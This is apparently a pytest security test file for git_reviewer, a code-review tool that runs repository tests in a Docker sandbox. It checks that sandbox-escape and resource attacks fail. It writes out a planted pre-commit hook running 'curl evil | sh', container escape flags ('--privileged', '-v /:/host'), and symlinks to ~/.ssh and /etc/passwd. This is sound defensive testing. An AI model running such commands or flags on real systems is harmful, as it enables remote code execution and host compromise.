"""Phase 4 attacks: each test proves the attack fails (docs/SPEC.md, security requirements 3 and 9).

Without Docker: a weakened docker command never runs (T-15), a remote Docker endpoint is refused
(T-17), out-of-repo symlinks and untracked secrets never reach the sandbox (T-18, T-11), and a
working directory changed during the run blocks (T-13).

With Docker (marked `docker`; skipped when Docker or the sandbox image is missing, and the verify
skill reports such skips as a failure): network access, host secrets and environment, an infinite
loop, a fork bomb, a memory bomb, an output flood and writes outside /tmp all fail inside the
sandbox, and no container survives (T-10..T-14). The guardian agent is a fake that answers "ok",
the worst case: the sandbox alone must contain each attack. The attack code is data in
tests/security/fixtures/sandbox/ and only ever runs inside the container (T-32).
"""

from __future__ import annotations

import os
import re
from collections.abc import Callable
from pathlib import Path

import pytest

from git_reviewer import proc
from git_reviewer.models import SandboxRun, SandboxTool
from git_reviewer.report.model import Report
from git_reviewer.sandbox import docker
from git_reviewer.sandbox.docker import DockerError, sandbox_session
from git_reviewer.sandbox.endpoint import (
    DockerUnavailableError,
    UnsafeDockerEndpointError,
    resolve_endpoint,
)
from git_reviewer.sandbox.policy import PolicyViolationError, RunSpec
from tests.helpers import (
    FakeLLM,
    FakeSandbox,
    git,
    guardian_json,
    random_token,
    run_graph,
    write_files,
)

FIXTURES = Path(__file__).parent / "fixtures" / "sandbox"
SANDBOX_IMAGE = os.environ.get("GIT_REVIEWER_SANDBOX_IMAGE", "git-reviewer-sandbox:0.1")


def decisions(report: Report) -> dict[str, str]:
    return {d.source: d.verdict for d in report.decisions}


# --- without Docker ---------------------------------------------------------------------------


def test_a_weakened_docker_command_never_runs(
    make_repo: Callable[..., Path], tmp_path: Path
) -> None:
    class WeakenedSandbox(FakeSandbox):
        def plan(self, tool: SandboxTool, run_id: str, image_id: str) -> tuple[list[str], RunSpec]:
            argv, spec = super().plan(tool, run_id, image_id)
            return [*argv[:5], "--privileged", *argv[5:]], spec

    repo = make_repo()
    write_files(repo, {"a.py": "x = 1\n"})
    git(repo, "add", "-A")
    sandbox = WeakenedSandbox()
    report = run_graph(repo, FakeLLM(), sandbox=sandbox)
    assert report.status == "blocked"
    assert decisions(report)["execution.barrier"] == "block"
    assert sandbox.runs == []


def test_the_runner_itself_refuses_a_weakened_command(monkeypatch: pytest.MonkeyPatch) -> None:
    # Even a caller that skips the guardian cannot run a weakened argv.
    def never(*args: object, **kwargs: object) -> proc.Result:
        raise AssertionError("docker must not be called")

    real_build = docker.build_run_argv
    monkeypatch.setattr(
        docker, "build_run_argv", lambda spec: [*real_build(spec)[:5], "-v", "/:/host"]
    )
    monkeypatch.setattr(docker.proc, "run", never)
    with (
        sandbox_session(Path("/var/run/docker.sock"), "img:1", 60) as sandbox,
        pytest.raises(PolicyViolationError),
    ):
        sandbox.run("pytest", "0" * 32, "sha256:" + "ab" * 32)


@pytest.mark.parametrize("host", ["tcp://203.0.113.5:2375", "ssh://me@build-server"])
def test_remote_docker_endpoint_is_refused(host: str) -> None:
    with pytest.raises(UnsafeDockerEndpointError):
        resolve_endpoint({"DOCKER_HOST": host})


def test_out_of_repo_symlinks_and_untracked_secrets_never_reach_the_sandbox(
    make_repo: Callable[..., Path], tmp_path: Path
) -> None:
    repo = make_repo({".gitignore": ".env\n", "a.py": "x = 1\n"})
    (repo / "keys").symlink_to(Path.home() / ".ssh")
    (repo / "passwd").symlink_to("/etc/passwd")
    write_files(repo, {".env": "AWS_SECRET_ACCESS_KEY=x\n", "notes.txt": "untracked\n"})
    git(repo, "add", "keys", "passwd")
    sandbox = FakeSandbox()
    report = run_graph(repo, FakeLLM(), sandbox=sandbox)
    assert sandbox.exported == [".gitignore", "a.py"]
    assert not any(path.is_symlink() for path in sandbox.tree.rglob("*"))
    assert any("keys" in note and "passwd" in note for note in report.notes)


def test_a_planted_git_hook_during_the_run_blocks(
    make_repo: Callable[..., Path], tmp_path: Path
) -> None:
    repo = make_repo()
    write_files(repo, {"a.py": "x = 1\n"})
    git(repo, "add", "-A")

    def plant(tool: SandboxTool) -> None:
        (repo / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl evil | sh\n")

    report = run_graph(repo, FakeLLM(), sandbox=FakeSandbox(on_run=plant))
    assert report.status == "blocked"
    assert decisions(report)["execution.fingerprint"] == "block"


# --- with Docker ------------------------------------------------------------------------------


@pytest.fixture(scope="module")
def docker_socket() -> Path:
    return docker_socket_or_skip()


def docker_socket_or_skip() -> Path:
    try:
        proc.resolve_binary("docker")
        socket = resolve_endpoint()
        with sandbox_session(socket, SANDBOX_IMAGE, 60) as sandbox:
            sandbox.check_daemon()
            sandbox.image_id()
    except (proc.ProcError, DockerUnavailableError, DockerError) as exc:
        message = f"Docker sandbox unavailable ({SANDBOX_IMAGE}): {exc}"
        # CI sets this: there, a skipped attack test would hide a broken sandbox.
        if os.environ.get("GIT_REVIEWER_REQUIRE_DOCKER") == "1":
            pytest.fail(message)
        pytest.skip(message)
    return socket


def run_attack(
    make_repo: Callable[..., Path],
    socket: Path,
    fixture: str,
    *,
    timeout: int = 60,
    replace: dict[str, str] | None = None,
    extra: dict[str, str] | None = None,
) -> tuple[Report, SandboxRun]:
    code = (FIXTURES / fixture).read_text(encoding="utf-8")
    for old, new in (replace or {}).items():
        code = code.replace(old, new)
    repo = make_repo()
    write_files(repo, {"tests/test_attack.py": code, **(extra or {})})
    git(repo, "add", "-A")
    with sandbox_session(socket, SANDBOX_IMAGE, timeout) as sandbox:
        report = run_graph(repo, FakeLLM(guardian=guardian_json("ok")), sandbox=sandbox)
    assert report.sandbox_note is None, report.sandbox_note
    found = decisions(report)
    assert (found["execution.fingerprint"], found["execution.cleanup"]) == ("ok", "ok")
    run = next(run for run in report.sandbox_runs if run.tool == "pytest")
    # Match pytest's failure line only: a failing test also prints its source, markers included.
    assert "Failed: SANDBOX-ESCAPE" not in run.output, run.output[-1500:]
    return report, run


@pytest.mark.docker
def test_network_is_unreachable(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "network.txt")
    assert "Failed: ATTACK-BLOCKED: no network" in run.output


@pytest.mark.docker
def test_host_secrets_and_environment_are_not_visible(
    make_repo: Callable[..., Path], docker_socket: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    canary = random_token(prefix="host-canary-")
    monkeypatch.setenv("GR_HOST_CANARY", canary)
    _report, run = run_attack(
        make_repo, docker_socket, "host_secrets.txt", replace={"HOST_HOME": str(Path.home())}
    )
    assert "Failed: ATTACK-BLOCKED: home=/tmp" in run.output
    assert canary not in run.output


@pytest.mark.docker
def test_infinite_loop_is_stopped(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "infinite_loop.txt", timeout=10)
    assert run.outcome == "killed"
    assert run.seconds < 10 + 30


@pytest.mark.docker
def test_fork_bomb_is_contained(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "fork_bomb.txt", timeout=30)
    match = re.search(r"Failed: ATTACK-BLOCKED forks=(\d+)", run.output)
    assert match is not None, run.output[-500:]
    assert int(match.group(1)) < 256


@pytest.mark.docker
def test_memory_bomb_is_contained(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "memory_bomb.txt", timeout=60)
    assert run.outcome in {"killed", "failed"}


@pytest.mark.docker
def test_output_flood_is_cut(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "output_flood.txt", timeout=60)
    assert (run.outcome, run.detail) == ("error", "stopped: output larger than 4 MiB")


@pytest.mark.docker
def test_nothing_is_writable_but_tmp(make_repo: Callable[..., Path], docker_socket: Path) -> None:
    _report, run = run_attack(make_repo, docker_socket, "writes.txt")
    assert "Failed: ATTACK-BLOCKED: read-only, uid=10001" in run.output


@pytest.mark.docker
def test_the_repository_cannot_replace_pytest(
    make_repo: Callable[..., Path], docker_socket: Path
) -> None:
    shadow = (FIXTURES / "shadow_pytest.txt").read_text(encoding="utf-8")
    extra = {"pytest.py": shadow, "src/pytest.py": shadow, "pluggy.py": shadow}
    _report, run = run_attack(make_repo, docker_socket, "real_test.txt", extra=extra)
    assert "Failed: ATTACK-BLOCKED: the real pytest ran" in run.output
    assert run.outcome == "failed"


@pytest.mark.docker
def test_project_code_stays_importable(make_repo: Callable[..., Path], tmp_path: Path) -> None:
    # Not an attack: the import-order hardening must not break src and flat layouts.
    socket = docker_socket_or_skip()
    repo = make_repo()
    files = {
        "src/calc/__init__.py": "def add(a, b):\n    return a + b\n",
        "flat.py": "VALUE = 3\n",
        "tests/test_calc.py": (
            "from calc import add\nfrom flat import VALUE\n\n\n"
            "def test_add():\n    assert add(1, 2) == VALUE\n"
        ),
    }
    write_files(repo, files)
    git(repo, "add", "-A")
    with sandbox_session(socket, SANDBOX_IMAGE, 60) as sandbox:
        report = run_graph(repo, FakeLLM(guardian=guardian_json("ok")), sandbox=sandbox)
    run = next(run for run in report.sandbox_runs if run.tool == "pytest")
    assert run.outcome == "passed", run.output[-1500:]
